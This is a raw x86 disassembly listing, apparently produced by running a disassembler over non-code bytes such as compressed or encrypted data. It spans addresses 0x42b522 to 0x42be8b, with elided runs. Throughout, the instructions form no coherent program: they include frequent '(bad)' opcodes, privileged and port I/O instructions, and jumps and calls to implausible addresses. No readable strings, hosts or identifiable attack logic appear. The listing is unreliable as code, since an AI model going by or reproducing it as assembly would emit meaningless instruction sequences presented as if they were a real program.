  42b522:	addr16 or ecx,ebx
  42b525:	mov    ah,0x88
  42b527:	sbb    al,0x55
  42b529:	mov    ch,0x86
  42b52b:	mov    ebp,0x77553f71
  42b530:	mov    ds:0x66703774,al
  42b535:	std    
  42b536:	cmp    ch,al
  42b538:	jno    0x42b588
  42b53a:	call   0x697423ce
  42b53f:	fisubr DWORD PTR [ecx]
  42b541:	mov    dh,0xf9
  42b543:	xor    eax,0xeb3450b7
  42b548:	xor    esp,eax
  42b54a:	ret    
  42b54b:	push   ss
  42b54c:	pusha  
  42b54d:	cmc    
  42b54e:	pop    ds
  42b54f:	cmp    bh,BYTE PTR ss:[ecx]
  42b552:	arpl   WORD PTR [edi-0x5b],cx
  42b555:	sbb    BYTE PTR [edx+eax*2],0x7c
  42b559:	cmp    ebx,DWORD PTR ds:0xc381bfbe
  42b55f:	clc    
  42b560:	push   0x19
  42b562:	test   BYTE PTR [ecx-0x43b2a62d],ch
  42b568:	cmp    ebx,esp
  42b56a:	ins    BYTE PTR es:[edi],dx
  42b56b:	je     0x42b551
  42b56d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b56e:	sub    edx,DWORD PTR [eax]
  42b570:	repnz add DWORD PTR [edi-0x78],eax
  42b574:	push   eax
  42b575:	out    dx,eax
  42b576:	xlat   BYTE PTR ds:[ebx]
  42b577:	jae    0x42b576
  42b579:	fcom   QWORD PTR [eax]
  42b57b:	clc    
  42b57c:	imul   DWORD PTR [ecx]
  42b57e:	adc    edi,esi
  42b580:	data16 mov dh,0x88
  42b583:	or     eax,0x6b9264d1
  42b589:	in     eax,0x39
  42b58b:	sub    bl,BYTE PTR [ebx-0x31]
  42b58e:	or     eax,0x79a244c5
  42b593:	ja     0x42b5e7
  42b595:	cmp    BYTE PTR [esp+eax*8],cl
  42b598:	shl    dl,1
  42b59a:	and    al,0xf9
  42b59c:	cmc    
  42b59d:	cmp    al,0xfa
  42b59f:	mov    WORD PTR [edi],gs
  42b5a1:	call   edx
  42b5a3:	sbb    al,0x5f
  42b5a5:	mov    bh,0xb1
  42b5a7:	imul   esp,DWORD PTR [ebp+edi*8+0x59],0x67
  42b5ac:	sbb    BYTE PTR [esi+0x320107e2],ah
  42b5b2:	add    eax,eax
  42b5b4:	cmc    
  42b5b5:	mov    ah,BYTE PTR [edi-0x5d32e417]
  42b5bb:	jbe    0x42b613
  42b5bd:	xchg   DWORD PTR [esi-0x3d],ebp
  42b5c0:	ret    
  42b5c1:	push   ecx
  42b5c2:	push   ss
  42b5c3:	gs into 
  42b5c5:	fiadd  DWORD PTR [ecx+0x63]
  42b5c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b5c9:	cmp    BYTE PTR [eax-0x7a7c3721],ch
  42b5cf:	cdq    
  42b5d0:	test   DWORD PTR [esi],edi
  42b5d2:	inc    ebp
  42b5d3:	cmp    al,0x49
  42b5d5:	mov    eax,ds:0xca17b136
  42b5da:	cli    
  42b5db:	daa    
  42b5dc:	out    dx,al
  42b5dd:	in     al,0x51
  42b5df:	(bad)  
  42b5e0:	call   0xc67ac0e0
  42b5e5:	or     eax,0x78c6a756
  42b5ea:	add    BYTE PTR [ebp+0x44],ch
  42b5ed:	push   cs
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	mov    bh,0x2d
  42b664:	repnz sub al,0x67
  42b667:	rol    DWORD PTR [ecx],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [edx*1-0x77b44f06],dl
  42b674:	pop    esp
  42b675:	cs sbb ebp,0xfdadc547
  42b67c:	or     esi,DWORD PTR [edi-0x15]
  42b67f:	mov    dl,0x85
  42b681:	lea    ebp,es:[ecx]
  42b684:	aad    0x22
  42b686:	mov    ecx,0xf9ad2b3c
  42b68b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b68d:	je     0x42b61b
  42b68f:	cwde   
  42b690:	ficomp DWORD PTR [esi-0x3606d7b5]
  42b696:	enter  0xc1b1,0x39
  42b69a:	cwde   
  42b69b:	add    DWORD PTR [ecx-0x3f02b6e2],0x3f1efd9b
  42b6a5:	mov    al,0x8a
  42b6a7:	adc    DWORD PTR [ebx-0x23],ebx
  42b6aa:	sbb    edi,DWORD PTR [ecx+0x16]
  42b6ad:	lods   al,BYTE PTR ds:[esi]
  42b6ae:	test   ch,0x76
  42b6b1:	(bad)  
  42b6b2:	or     al,0xf0
  42b6b4:	sbb    esi,DWORD PTR [ebp-0x3a]
  42b6b7:	aad    0x23
  42b6b9:	aam    0xb5
  42b6bb:	cmp    ebx,edx
  42b6bd:	add    al,0x56
  42b6bf:	and    al,0x7c
  42b6c1:	inc    ecx
  42b6c2:	ss jmp 0xf5043311
  42b6c8:	jb     0x42b70b
  42b6ca:	ret    
  42b6cb:	fwait
  42b6cc:	and    eax,DWORD PTR [ebp+0x148b9f1a]
  42b6d2:	xor    ecx,DWORD PTR [ebp+ecx*1+0x70]
  42b6d6:	dec    ebp
  42b6d7:	les    ebx,FWORD PTR [eax+0x35]
  42b6da:	pop    edx
  42b6db:	fmul   DWORD PTR [ebx]
  42b6dd:	sbb    ch,cl
  42b6df:	ins    DWORD PTR es:[edi],dx
  42b6e0:	pop    edi
  42b6e1:	daa    
  42b6e2:	xor    dl,BYTE PTR [edi]
  42b6e4:	rcl    DWORD PTR [edx-0xc83934b],0xc7
  42b6eb:	xchg   ebp,eax
  42b6ec:	inc    esp
  42b6ed:	out    dx,al
  42b6ee:	repz xchg ebx,eax
  42b6f0:	inc    ebx
  42b6f1:	push   es
  42b6f2:	xchg   ecx,eax
  42b6f3:	stos   DWORD PTR es:[edi],eax
  42b6f4:	sub    eax,0x9c150d0a
  42b6f9:	int    0x85
  42b6fb:	ret    
  42b6fc:	in     al,dx
  42b6fd:	push   eax
  42b6fe:	mov    dl,bl
  42b700:	dec    ecx
  42b701:	push   0x3bf19bae
  42b706:	mov    bh,0xdc
  42b708:	mov    ch,0xd9
  42b70a:	(bad)  
  42b70b:	je     0x42b780
  42b70d:	jnp    0x42b6cd
  42b70f:	add    bl,BYTE PTR [ebx-0x15]
  42b712:	js     0x42b713
  42b714:	ins    DWORD PTR es:[edi],dx
  42b715:	pop    ebp
  42b716:	addr16 iret 
  42b718:	ret    0xc437
  42b71b:	pusha  
  42b71c:	sub    ch,BYTE PTR [ecx-0x195d9b33]
  42b722:	adc    ebx,edx
  42b724:	mov    esi,0xf9e49d36
  42b729:	ret    
  42b72a:	jno    0x42b6ed
  42b72c:	lods   al,BYTE PTR ds:[esi]
  42b72d:	scas   eax,DWORD PTR es:[edi]
  42b72e:	mov    ah,0x2b
  42b730:	inc    ebp
  42b731:	cdq    
  42b732:	(bad)  
  42b733:	fdivr  st(6),st
  42b735:	enter  0x3e91,0xf3
  42b739:	and    bh,dh
  42b73b:	xor    BYTE PTR [edx+0x5abcba6c],bh
  42b741:	test   edi,ebp
  42b743:	bound  eax,QWORD PTR ds:0xab30861d
  42b749:	icebp  
  42b74a:	arpl   WORD PTR [ebx+0x14],ax
  42b74d:	fs sti 
  42b74f:	(bad)  ds:0x4773dfce
  42b755:	aad    0x24
  42b757:	icebp  
  42b758:	mov    edx,0xa300b63e
  42b75d:	dec    edi
  42b75e:	leave  
  42b75f:	iret   
  42b760:	xor    BYTE PTR [ebx],dh
  42b762:	stc    
  42b763:	xchg   BYTE PTR [edi+0x24],bh
  42b766:	xchg   edx,eax
  42b767:	sbb    BYTE PTR [esi],bl
  42b769:	int    0x44
  42b76b:	mov    dh,0x32
  42b76d:	or     DWORD PTR [eax],eax
	...
  42b7d3:	add    BYTE PTR [eax],al
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	mov    al,0xeb
  42b7e4:	push   edi
  42b7e5:	in     al,0x67
  42b7e7:	rol    BYTE PTR [ecx],cl
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    dh,bh
  42b7ef:	lea    edx,[esi-0x43914155]
  42b7f5:	push   0xffffffc1
  42b7f7:	mov    al,0xe9
  42b7f9:	pop    eax
  42b7fa:	and    BYTE PTR [edi+0x5d74ab2a],bl
  42b800:	xor    DWORD PTR [ecx+0x2e],0xffffff83
  42b804:	fdivr  QWORD PTR [edx+0x7f]
  42b807:	je     0x42b80d
  42b809:	call   0x33f16fb5
  42b80e:	sub    al,0xe7
  42b810:	inc    eax
  42b811:	mov    ds:0xd1d4d85f,al
  42b816:	mov    WORD PTR ds:0x32243894,ds
  42b81c:	jae    0x42b7d2
  42b81e:	push   ebp
  42b81f:	inc    ebx
  42b820:	dec    eax
  42b821:	lds    eax,FWORD PTR [esi+0x5b]
  42b824:	cmp    al,0x38
  42b826:	mov    al,0x21
  42b828:	inc    edx
  42b829:	sub    DWORD PTR [eax+0x4],edi
  42b82c:	cmp    eax,0x17b72417
  42b831:	add    DWORD PTR [ecx],edx
  42b833:	xchg   edx,eax
  42b834:	ja     0x42b88a
  42b836:	sti    
  42b837:	test   al,0x63
  42b83a:	push   ebp
  42b83b:	xor    DWORD PTR [eax-0x2e2ad11b],edi
  42b841:	je     0x42b82d
  42b843:	dec    ebp
  42b844:	imul   esp,ebx,0xfffffffc
  42b847:	cli    
  42b848:	sub    eax,0x90b91013
  42b84d:	lahf   
  42b84e:	ret    
  42b84f:	fcom   st(5)
  42b851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b852:	outs   dx,DWORD PTR ds:[esi]
  42b853:	pop    edx
  42b854:	jle    0x42b812
  42b856:	mov    ebp,0x17b36187
  42b85b:	call   0xe423:0x180a38cc
  42b862:	iret   
  42b863:	and    BYTE PTR [ecx-0x30],cl
  42b866:	and    DWORD PTR [edi-0x77411701],edx
  42b86c:	jecxz  0x42b871
  42b86e:	sub    DWORD PTR [edx+0x34],edx
  42b871:	mov    esp,0x50ae2f1d
  42b876:	xchg   ebx,eax
  42b877:	out    0x3c,al
  42b879:	das    
  42b87a:	test   al,0xe3
  42b87c:	add    ch,0x5c
  42b87f:	jnp    0x42b8b7
  42b881:	das    
  42b882:	in     eax,0x6b
  42b884:	(bad)  
  42b885:	in     al,0x22
  42b887:	sub    dl,ah
  42b889:	sbb    edi,DWORD PTR [ecx-0x71b188a7]
  42b88f:	mov    edx,0xe576808d
  42b894:	cmp    eax,0x7e4a6f4
  42b899:	(bad)  
  42b89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b89b:	call   0xb078:0x7cae98c9
  42b8a2:	inc    edx
  42b8a3:	mov    ebp,0x1dbbf971
  42b8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b8a9:	sub    dl,BYTE PTR [esi+0x3e0ec579]
  42b8af:	shr    ebp,cl
  42b8b1:	es pop ebx
  42b8b3:	and    dh,dl
  42b8b5:	mov    eax,0xd02e7555
  42b8ba:	cli    
  42b8bb:	push   eax
  42b8bc:	sub    al,0xb0
  42b8be:	dec    esp
  42b8bf:	xor    bh,dl
  42b8c1:	xchg   DWORD PTR [ecx],ebp
  42b8c3:	(bad)  
  42b8c4:	mov    eax,0x692db1c6
  42b8c9:	and    BYTE PTR [ebx-0x1e4d94d],0xab
  42b8d0:	(bad)  
  42b8d1:	jmp    0x8064:0x353a571b
  42b8d8:	jg     0x42b8d8
  42b8da:	mov    eax,0x3ace75f2
  42b8df:	sub    al,0xb8
  42b8e1:	sbb    BYTE PTR [ebp-0x5b],bh
  42b8e4:	pop    ss
  42b8e5:	adc    ebp,DWORD PTR [edx-0x22]
  42b8e8:	clc    
  42b8e9:	pop    eax
  42b8ea:	lock push esp
  42b8ec:	push   ebp
  42b8ed:	mov    eax,ds:0x0
	...
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     edi,DWORD PTR [edx-0x13]
  42b964:	inc    eax
  42b965:	aas    
  42b966:	rol    DWORD PTR [bx+di],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    BYTE PTR [eax],bl
  42b96f:	addr16 pusha 
  42b971:	dec    DWORD PTR [edx]
  42b973:	xlat   BYTE PTR ds:[ebx]
  42b974:	xor    eax,0x109ac704
  42b979:	mov    bh,0xf7
  42b97b:	or     ch,cl
  42b97d:	jmp    0xbd57c86a
  42b982:	ja     0x42b9fc
  42b984:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42b986:	jnp    0x42b978
  42b988:	(bad)  
  42b98a:	fcomp  DWORD PTR [ebx-0x20e1302e]
  42b990:	(bad)  [ebp-0x14]
  42b993:	fcom   QWORD PTR [ecx+0x78]
  42b996:	popa   
  42b997:	add    edi,DWORD PTR [edi+eiz*2]
  42b99a:	sub    DWORD PTR [esi],0xca9929fb
  42b9a0:	fxch   st(1)
  42b9a2:	into   
  42b9a3:	(bad)  
  42b9a4:	mov    ebx,0x7bc87a0c
  42b9a9:	out    0x9,eax
  42b9ab:	out    dx,eax
  42b9ac:	popf   
  42b9ad:	test   al,0xdd
  42b9af:	icebp  
  42b9b0:	fdiv   QWORD PTR [ebx]
  42b9b2:	pop    edi
  42b9b3:	dec    esi
  42b9b4:	lock aaa 
  42b9b6:	xor    ah,BYTE PTR [ebp+0x46]
  42b9b9:	cli    
  42b9ba:	hlt    
  42b9bb:	into   
  42b9bc:	loopne 0x42ba1e
  42b9be:	mul    BYTE PTR [ebp+ebx*4-0x153a71ac]
  42b9c5:	and    BYTE PTR [esp+ebx*8],dl
  42b9c8:	or     BYTE PTR [edx],cl
  42b9ca:	add    esp,DWORD PTR [eax-0x3578932f]
  42b9d0:	fxch   st(0)
  42b9d2:	pop    eax
  42b9d3:	out    dx,al
  42b9d4:	ficom  DWORD PTR [eax]
  42b9d6:	outs   dx,BYTE PTR ds:[esi]
  42b9d7:	sbb    al,0xe2
  42b9d9:	or     bl,dl
  42b9db:	dec    esi
  42b9dc:	(bad)
  42b9df:	data16 cmp bh,bh
  42b9e2:	cmp    esp,ebx
  42b9e4:	or     al,0x8b
  42b9e6:	sbb    BYTE PTR [edi-0x5d],ch
  42b9e9:	sbb    cl,0x8f
  42b9ec:	ds in  eax,0x36
  42b9ef:	ret    0xc9a1
  42b9f2:	adc    al,0xcc
  42b9f4:	pop    es
  42b9f5:	or     edi,DWORD PTR [ebx]
  42b9f7:	arpl   WORD PTR [eax-0x5],sp
  42b9fa:	loop   0x42ba1d
  42b9fc:	mov    ds:0x202effee,al
  42ba01:	stc    
  42ba02:	add    eax,0x7dc511ac
  42ba07:	enter  0x5cd2,0xc5
  42ba0b:	icebp  
  42ba0c:	and    al,0x1b
  42ba0e:	mov    ebx,0xa5fc5229
  42ba13:	loop   0x42b9b1
  42ba15:	lods   eax,DWORD PTR ds:[esi]
  42ba16:	push   cs
  42ba17:	test   BYTE PTR [esi],al
  42ba19:	shr    bl,1
  42ba1b:	xor    ecx,DWORD PTR [edx-0x3a]
  42ba1e:	mov    ?,WORD PTR [edi+0x2c26bd95]
  42ba24:	mov    ebp,0x829289e4
  42ba29:	jo     0x42ba39
  42ba2b:	imul   edx,DWORD PTR [eax+0x7d495935],0xffffff85
  42ba32:	bound  esp,QWORD PTR [ecx+esi*1-0x519a5e7d]
  42ba39:	jmp    0x222b6739
  42ba3e:	je     0x42ba08
  42ba40:	or     edi,DWORD PTR [edi+0x77]
  42ba43:	and    esi,DWORD PTR ds:0x706c88cf
  42ba49:	xchg   ecx,eax
  42ba4a:	(bad)  
  42ba4b:	aad    0xcb
  42ba4d:	pop    ds
  42ba4e:	fisttp DWORD PTR [edi-0x8]
  42ba51:	bound  edi,QWORD PTR [esi]
  42ba53:	or     ch,BYTE PTR [esi+edx*4-0xb]
  42ba57:	inc    esi
  42ba58:	or     al,0x11
  42ba5a:	pop    esp
  42ba5b:	add    eax,0x530ca28
  42ba60:	or     edx,edx
  42ba62:	pusha  
  42ba63:	js     0x42bab6
  42ba65:	mov    ch,0x20
  42ba67:	mov    ch,0x19
  42ba69:	dec    ebx
  42ba6a:	cmp    BYTE PTR [ebx+0x6700],ah
	...
  42bad4:	add    BYTE PTR [eax],al
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [ebp-0x18],edx
  42bae4:	sbb    eax,0x1d467a5
  42bae9:	add    BYTE PTR [eax],al
  42baeb:	add    DWORD PTR [eax],eax
  42baed:	add    BYTE PTR [ebx+esi*8+0x76],cl
  42baf1:	mov    esp,0xce7138a3
  42baf6:	add    BYTE PTR [esi+0x14],bh
  42baf9:	adc    eax,DWORD PTR [ebx+esi*1-0x2a]
  42bafd:	jle    0x42baa8
  42baff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb00:	add    DWORD PTR [eax-0x59],ebp
  42bb03:	mov    edx,0xb888a461
  42bb08:	xlat   BYTE PTR ds:[ebx]
  42bb09:	xchg   ebp,eax
  42bb0a:	daa    
  42bb0b:	in     al,dx
  42bb0c:	or     DWORD PTR [ebx+eiz*4],esp
  42bb0f:	bswap  eax
  42bb11:	jmp    ebx
  42bb13:	cmp    eax,0xb913a01e
  42bb18:	push   eax
  42bb19:	jb     0x42bab5
  42bb1b:	dec    BYTE PTR [ebp+0x58]
  42bb1e:	push   es
  42bb1f:	cwde   
  42bb20:	and    BYTE PTR [edi+0x5af60338],dh
  42bb26:	inc    edx
  42bb27:	jae    0x42bb1c
  42bb29:	push   edx
  42bb2a:	repz imul BYTE PTR [esi]
  42bb2d:	xor    bl,BYTE PTR [ebx-0x189d3c8e]
  42bb33:	out    0x9b,al
  42bb35:	cmp    bh,ch
  42bb37:	dec    edi
  42bb38:	out    dx,al
  42bb39:	aam    0x9
  42bb3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb3c:	jmp    0x42bb46
  42bb3e:	(bad)  
  42bb40:	(bad)  
  42bb42:	jns    0x42bafc
  42bb44:	cmc    
  42bb45:	xchg   ebp,eax
  42bb46:	inc    edx
  42bb47:	mov    ecx,0x28a24fdd
  42bb4c:	xchg   ecx,eax
  42bb4d:	inc    edi
  42bb4e:	and    DWORD PTR [ecx+0x27],0x42d4db83
  42bb55:	pop    edi
  42bb56:	inc    eax
  42bb57:	not    DWORD PTR [edx-0x3f]
  42bb5a:	cdq    
  42bb5b:	xchg   ebp,eax
  42bb5c:	add    DWORD PTR [ecx-0x75],ebx
  42bb5f:	inc    edx
  42bb60:	(bad)  
  42bb61:	clc    
  42bb62:	mov    DWORD PTR [edi-0x60b979a9],ebp
  42bb68:	into   
  42bb69:	push   0x7d4bf2b6
  42bb6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb6f:	(bad)  
  42bb70:	cld    
  42bb71:	xchg   esi,eax
  42bb72:	jae    0x42bb49
  42bb74:	ss jb  0x42bb04
  42bb77:	pop    esi
  42bb78:	xor    BYTE PTR [ecx+0x772e8424],al
  42bb7e:	sar    DWORD PTR [esi-0x9b65fe4],1
  42bb84:	pop    esp
  42bb85:	aas    
  42bb86:	and    ebx,DWORD PTR [edi-0x40c14d3d]
  42bb8c:	and    al,BYTE PTR ds:0x6454150
  42bb92:	hlt    
  42bb93:	add    DWORD PTR [ebx+0x12],esi
  42bb96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb97:	les    edi,FWORD PTR [eax-0x1ceaed0f]
  42bb9d:	out    dx,al
  42bb9e:	mov    dh,0xa9
  42bba0:	xor    edx,DWORD PTR [eax]
  42bba2:	mov    edx,0x8de4c641
  42bba7:	add    al,dl
  42bba9:	test   DWORD PTR [edi+eiz*1+0x3c684665],edi
  42bbb0:	jecxz  0x42bb9a
  42bbb2:	sub    edi,DWORD PTR [ecx]
  42bbb4:	sahf   
  42bbb5:	ja     0x42bc17
  42bbb7:	push   ss
  42bbb8:	cli    
  42bbb9:	add    dl,BYTE PTR [edi]
  42bbbb:	inc    ebp
  42bbbc:	(bad)  
  42bbbd:	pop    edi
  42bbbe:	xchg   BYTE PTR ds:0x7904d9b,dh
  42bbc4:	lea    esp,[edx+edi*2]
  42bbc7:	sti    
  42bbc8:	aas    
  42bbc9:	popf   
  42bbca:	popa   
  42bbcb:	mov    esi,DWORD PTR [edi+0x2136d2ac]
  42bbd1:	out    0x8f,eax
  42bbd3:	sub    BYTE PTR [eax+0x56],bl
  42bbd6:	xor    DWORD PTR [esi+0x2a],0x6a1a33f
  42bbdd:	out    dx,al
  42bbde:	xchg   ecx,eax
  42bbdf:	xchg   ebx,eax
  42bbe0:	jae    0x42bb75
  42bbe2:	sub    al,0xf9
  42bbe4:	test   al,0x4c
  42bbe6:	leave  
  42bbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bbe8:	lods   eax,DWORD PTR ds:[esi]
  42bbe9:	loope  0x42bbf9
  42bbeb:	inc    eax
  42bbec:	ins    BYTE PTR es:[edi],dx
  42bbed:	test   DWORD PTR [eax],0x0
	...
  42bc53:	add    BYTE PTR [eax],al
  42bc55:	add    BYTE PTR [eax+ebp*1],dh
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	cmp    bh,BYTE PTR [eax-0xd]
  42bc65:	scas   al,BYTE PTR es:[edi]
  42bc66:	addr16 aad 0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    BYTE PTR [esi-0x26c92efe],dh
  42bc73:	ja     0x42bc39
  42bc75:	bound  ebp,QWORD PTR [esi-0x6]
  42bc78:	mov    dh,BYTE PTR [ecx+0x1dc5e3b5]
  42bc7e:	xchg   ecx,eax
  42bc7f:	or     DWORD PTR [edi-0x5a],eax
  42bc82:	stc    
  42bc83:	aas    
  42bc84:	daa    
  42bc85:	imul   eax,edi,0x87aff8de
  42bc8b:	pop    edi
  42bc8c:	mov    DWORD PTR [edi+0x2b],ebp
  42bc8f:	inc    ecx
  42bc90:	outs   dx,DWORD PTR ds:[esi]
  42bc91:	loope  0x42bcfe
  42bc93:	xchg   BYTE PTR ss:[ecx+0x9],cl
  42bc97:	rol    BYTE PTR [ebx+0x18],0xd7
  42bc9b:	das    
  42bc9c:	push   esp
  42bc9d:	mov    ecx,0x8e5b5fa5
  42bca2:	cmp    eax,0x27b80cf6
  42bca7:	icebp  
  42bca8:	xchg   esi,eax
  42bca9:	ja     0x42bc51
  42bcab:	imul   ecx,edi,0xa
  42bcae:	sub    BYTE PTR [ebp+eax*1+0x11d4ca8f],ch
  42bcb5:	call   0xdddc45f5
  42bcba:	fisubr WORD PTR [esi-0x53]
  42bcbd:	lea    esi,[esi+0x5d9b131f]
  42bcc3:	pop    esi
  42bcc4:	pop    ebx
  42bcc5:	adc    BYTE PTR [ebx+0x35],ah
  42bcc8:	or     dh,BYTE PTR [edi]
  42bcca:	ja     0x42bd07
  42bccc:	sbb    DWORD PTR [ebp+0x1765b99],esi
  42bcd2:	mov    ds:0xc5c0e2cd,al
  42bcd7:	xorps  xmm6,xmm4
  42bcda:	xchg   edi,eax
  42bcdb:	dec    esp
  42bcdc:	outs   dx,BYTE PTR ds:[esi]
  42bcdd:	daa    
  42bcde:	mov    cl,0x9
  42bce0:	stos   BYTE PTR es:[edi],al
  42bce1:	jmp    0x2c535b25
  42bce6:	mov    al,ds:0x730d827f
  42bceb:	cmp    DWORD PTR [edx],ebx
  42bced:	outs   dx,BYTE PTR ds:[esi]
  42bcee:	ds addr16 retf 
  42bcf1:	cmp    BYTE PTR [edx+0x4ca41ca],bh
  42bcf7:	push   ecx
  42bcf8:	pop    edx
  42bcf9:	sahf   
  42bcfa:	jae    0x42bd00
  42bcfc:	pop    edi
  42bcfd:	jae    0x42bc86
  42bcff:	push   edi
  42bd00:	sub    al,0xca
  42bd02:	lods   al,BYTE PTR ds:[esi]
  42bd03:	push   esp
  42bd04:	cmp    bl,BYTE PTR [edi]
  42bd06:	fadd   DWORD PTR [ecx+0x33e4e645]
  42bd0c:	daa    
  42bd0d:	pop    eax
  42bd0e:	lock add DWORD PTR [ebx+0x4e],esp
  42bd12:	(bad)
  42bd17:	sub    dl,bl
  42bd19:	cmp    BYTE PTR [esi-0x7a],ah
  42bd1c:	adc    DWORD PTR [ecx+0x6e],esp
  42bd1f:	loopne 0x42bcb6
  42bd21:	rcl    esi,cl
  42bd23:	ss sub ebp,eax
  42bd26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd27:	mov    eax,DWORD PTR [edi]
  42bd29:	xchg   DWORD PTR [ebx+eax*1],ecx
  42bd2c:	out    dx,eax
  42bd2d:	pavgb  mm3,QWORD PTR [edi+esi*2-0x378df085]
  42bd35:	inc    edi
  42bd36:	hlt    
  42bd37:	jecxz  0x42bcf7
  42bd39:	fisttp WORD PTR [esi]
  42bd3b:	popf   
  42bd3c:	shr    DWORD PTR [ebx+edi*8+0x5e],cl
  42bd40:	xor    esp,ecx
  42bd42:	mov    WORD PTR [ebx-0x29],?
  42bd45:	scas   al,BYTE PTR es:[edi]
  42bd46:	push   eax
  42bd47:	loope  0x42bd81
  42bd49:	mov    eax,ds:0xf9225ce2
  42bd4e:	mov    cl,0x1c
  42bd50:	or     cl,BYTE PTR [edi]
  42bd52:	scas   eax,DWORD PTR es:[edi]
  42bd53:	xor    BYTE PTR [ebx*1+0x44ea847b],bl
  42bd5a:	cmp    bh,BYTE PTR [edi+0x4c]
  42bd5d:	sbb    eax,0x6ec9a62
  42bd62:	mov    ah,0xb0
  42bd64:	mov    ch,BYTE PTR [edx-0x78]
  42bd67:	xchg   edx,eax
  42bd68:	jle    0x42bd1c
  42bd6a:	mov    edi,DWORD PTR [ebp+0x19]
  42bd6d:	xchg   edx,eax
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42be06
  42bde3:	xchg   edx,eax
  42bde4:	pushf  
  42bde5:	cdq    
  42bde6:	addr16 (bad) 
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	pop    ecx
  42bdef:	ja     0x42be45
  42bdf1:	add    eax,0x4d81a14f
  42bdf6:	popf   
  42bdf7:	or     BYTE PTR [esi],0xc2
  42bdfa:	dec    ebp
  42bdfb:	int3   
  42bdfc:	push   ebx
  42bdfd:	mov    dl,0xa2
  42bdff:	repnz mov cl,0xb
  42be02:	addr16 das 
  42be04:	pop    es
  42be05:	repnz mov WORD PTR [ebx],gs
  42be08:	(bad)  
  42be09:	pop    ecx
  42be0a:	scas   eax,DWORD PTR es:[edi]
  42be0b:	ins    DWORD PTR es:[edi],dx
  42be0c:	lahf   
  42be0d:	pusha  
  42be0e:	cmovg  ecx,DWORD PTR [edi-0x6f0ef4fc]
  42be15:	push   ss
  42be16:	ret    
  42be17:	dec    ecx
  42be18:	fs pusha 
  42be1a:	xor    DWORD PTR [edi],ebx
  42be1c:	ss or  al,0xf7
  42be1f:	add    DWORD PTR [ebp+0x59],esp
  42be22:	sahf   
  42be23:	imul   esi,eax,0xdb526171
  42be29:	add    ebx,DWORD PTR [eax-0x2da50f42]
  42be2f:	jb     0x42be82
  42be31:	shl    dl,cl
  42be33:	sub    ebx,DWORD PTR [edi-0x18]
  42be36:	aad    0x9d
  42be38:	or     BYTE PTR [ecx+0x33],al
  42be3b:	push   0xffffff8f
  42be3d:	mov    ebx,0x7631dd1a
  42be42:	xchg   edx,eax
  42be43:	shl    DWORD PTR [esi+0x54],cl
  42be46:	pop    ds
  42be47:	inc    edi
  42be48:	(bad)  
  42be49:	out    dx,al
  42be4a:	ds jne 0x42bead
  42be4d:	mov    dh,0xea
  42be4f:	pop    DWORD PTR [eax-0x55]
  42be52:	scas   eax,DWORD PTR es:[edi]
  42be53:	int    0x3b
  42be55:	ja     0x42bea9
  42be57:	neg    BYTE PTR fs:[ebp+0x3d1268e4]
  42be5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be5f:	pop    ds
  42be60:	in     eax,dx
  42be61:	scas   eax,DWORD PTR es:[edi]
  42be62:	sub    DWORD PTR [ecx-0x3ad17a36],eax
  42be68:	std    
  42be69:	push   ebx
  42be6a:	daa    
  42be6b:	or     esp,esi
  42be6d:	push   esp
  42be6e:	into   
  42be6f:	dec    esi
  42be70:	stos   DWORD PTR es:[edi],eax
  42be71:	js     0x42be05
  42be73:	sbb    ecx,ecx
  42be75:	fist   WORD PTR [ebp+0x71]
  42be78:	ds (bad) 
  42be7a:	xor    esp,DWORD PTR [ebx-0x3c]
  42be7d:	ins    DWORD PTR es:[edi],dx
  42be7e:	pop    ds
  42be7f:	int3   
  42be80:	lods   al,BYTE PTR ds:[esi]
  42be81:	cmc    
  42be82:	and    al,0x7d
  42be84:	cld    
  42be85:	(bad)  [edx]
  42be87:	adc    al,0x97
  42be89:	sub    cl,dl
  42be8b:	inc    ebx
